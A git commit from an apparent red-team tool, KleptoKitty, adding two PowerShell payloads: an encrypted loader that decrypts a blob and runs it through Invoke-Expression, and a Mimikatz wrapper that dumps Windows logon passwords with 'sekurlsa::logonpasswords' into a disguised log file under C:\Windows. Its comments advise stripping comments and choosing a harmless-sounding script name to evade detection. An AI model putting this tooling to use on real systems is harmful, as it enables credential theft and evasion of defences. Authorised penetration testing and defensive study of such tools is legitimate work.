c226a37789d84eca7fd8811bc381e01351ae048b
Michael Schneider <misc@scip.ch>
2020-08-04 12:54:02 +0200

    Add payload CredentialAccess-Mimikatz

---
+++ payloads/CredentialAccess-Mimikatz-Encrypted.ps1
@@ -0,0 +1,43 @@
+<#
+
+     =^._.^=
+    _(      )/  KleptoKitty
+
+    How to build payload:
+
+    1. Encrypt CredentialAccess-Mimikatz by using helpers/Invoke-Rijndael.ps1
+    2. Copy Token to KleptoKitty, Token is concatenated from passphrase, salt, and init
+
+#>
+
+[CmdletBinding()]
+Param (
+    [String]
+    $Token    
+)
+
+$passphrase = $Token.substring(0,32)
+$salt = $Token.substring(32,32)
+$init = $Token.substring(64,32)
+
+function Decrypt-String($Encrypted) { 
+    $Encrypted = [Convert]::FromBase64String($Encrypted) 
+    $r = new-Object System.Security.Cryptography.RijndaelManaged 
+    $pass = [Text.Encoding]::UTF8.GetBytes($passphrase) 
+    $salt = [Text.Encoding]::UTF8.GetBytes($salt) 
+    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
+    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] 
+    $d = $r.CreateDecryptor() 
+    $ms = new-Object IO.MemoryStream @(,$Encrypted) 
+    $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,"Read" 
+    $sr = new-Object IO.StreamReader $cs 
+    Write-Output $sr.ReadToEnd() 
+    $sr.Close() 
+    $cs.Close() 
+    $ms.Close() 
+    $r.Clear() 
+}
+
+$Blob = "<insert encrypted string here>"
+$Command = Decrypt-String($Blob)
+Invoke-Expression -Command $Command
---
+++ payloads/CredentialAccess-Mimikatz.ps1
@@ -0,0 +1,30 @@
+<#
+
+     =^._.^=
+    _(      )/  KleptoKitty
+
+    How to build payload:
+
+    1. Get Invoke-Mimikatz from Empire Framework
+       https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/
+    
+    2. Use Mimikatz in script or replace it by your own version
+       Build Mimikatz from code (Target Second_Release_PowerShell), convert powerkatz.dll to base64 and replace $PEBytes32 and $PEBytes64
+   
+    3. Strip comments and use a harmless-sounding name for the script
+
+#>
+
+Function FormerlyKnownAsMimikatz {
+
+    # < add the script here >
+
+}
+
+# Log
+$TargetBasePath = "Windows"
+$TargetLogName = "de-ch.log"
+$TargetLogLocalPath = "C:\$TargetBasePath\$TargetLogName"
+
+# Run Payload
+FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug sekurlsa::logonpasswords"
